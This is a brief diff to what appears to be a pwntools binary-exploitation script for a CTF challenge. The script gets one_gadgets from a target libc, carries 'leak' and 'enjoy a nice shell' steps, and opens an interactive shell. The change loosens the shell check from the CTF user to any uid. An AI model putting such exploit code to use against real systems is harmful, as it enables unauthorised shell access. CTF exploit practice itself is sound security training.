@@ -31,8 +31,7 @@ else:
 
 one_gadgets = get_one_gadgets(target_libc.path)
 
-pause()
-
+sys.stdout.write(io.recvuntil(b'\n\n'))
 io.recvuntil(b'challenges\n\n')
 
 # step 1: leak
@@ -80,7 +79,7 @@ io.sendline()
 # step 4: enjoy a nice shell
 io.sendline(b'id')
 id_result = io.recvline()
-if b'uid=999(ctf)' in id_result:
+if b'uid=' in id_result:
 	log.success('shell: %s', id_result.decode('ascii').strip())
 	io.interactive()
 else:
